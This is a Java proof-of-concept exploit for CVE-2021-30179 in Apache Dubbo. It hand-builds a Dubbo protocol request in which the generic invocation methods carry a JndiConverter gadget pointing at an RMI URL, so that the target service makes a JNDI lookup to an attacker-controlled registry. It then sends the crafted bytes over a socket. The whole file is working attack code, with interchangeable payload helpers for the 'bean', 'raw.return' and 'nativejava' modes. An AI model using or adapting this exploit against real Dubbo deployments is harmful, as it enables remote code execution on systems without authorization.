package org.example;

import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;

/**
 * @author Whoopsunix
 *
 * CVE-2021-30179
 *
 * 2.5.x、[2.6.0, 2.6.8]、[2.7.0, 2.7.9]
 */
public class CVE_2021_30179 {
    public static void main(String[] args) throws Exception {
        // HEADER
        byte[] header = new byte[16];

        // SET MAGIC NUMBER
        Bytes.short2bytes((short) 0xdabb, header);

        // HESSIAN SERIALIZED RESPONSE
        header[2] = (byte) ((byte) 0x80 | 2);

        // NOK RESPONSE STATUS
//        header[3] = (byte) 0;

        // ID
        Bytes.long2bytes(666, header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // 1.dubboVersion
        out.writeUTF("2.7.6");
        // 2.path
        out.writeUTF("org.example.api.DemoService");
        // 3.version
        out.writeUTF("1.0");
        // 4.methodName
        out.writeUTF("$invoke");
        // 5.methodDesc
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        // 6.paramsObject
        out.writeUTF("sayHello");
        out.writeObject(new String[]{"java.lang.String"});

        String url = "rmi://127.0.0.1:1099/uljii0";
//        bean(out, url);
        rawReturn(out,url);

        out.flushBuffer();


        // 发送请求
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    public static void bean(Hessian2ObjectOutput out, String url) throws Exception {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter", 7);
        javaBeanDescriptor.setProperty("asText", url);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap map = new HashMap();
        map.put("generic", "bean");
        out.writeObject(map);
    }

    public static void rawReturn(Hessian2ObjectOutput out, String url) throws Exception {
        HashMap map = new HashMap();
        map.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        map.put("asText", url);
        out.writeObject(new Object[]{map});
        HashMap map2 = new HashMap();
        map2.put("generic", "raw.return");
        out.writeObject(map2);
    }

    public static void nativeJava(Hessian2ObjectOutput out, String url) throws Exception {
        byte[] data = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(url));
        out.writeObject(new Object[]{data});
        HashMap map = new HashMap();
        map.put("generic", "nativejava");
        out.writeObject(map);
    }

}
